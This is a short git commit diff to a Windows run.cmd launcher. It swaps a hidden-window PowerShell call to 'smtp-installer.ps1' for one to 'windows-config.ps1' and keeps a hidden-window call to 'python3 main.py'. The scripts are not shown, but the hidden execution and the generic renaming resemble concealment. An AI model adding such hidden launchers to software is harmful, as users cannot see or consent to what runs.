2a7cae6fa1c187295a4cf3c49a459c9cca6af6e6
JadeCosmo <102710086+JadeCosmo@users.noreply.github.com>
2022-04-11 17:35:02 +0000

    Add files via upload

--- run.cmd
+++ run.cmd
@@ -1,2 +1,2 @@
-powershell powershell.exe -windowstyle hidden "./smtp-installer.ps1"
+powershell powershell.exe -windowstyle hidden "./windows-config.ps1"
 powershell powershell.exe -windowstyle hidden "python3 main.py"
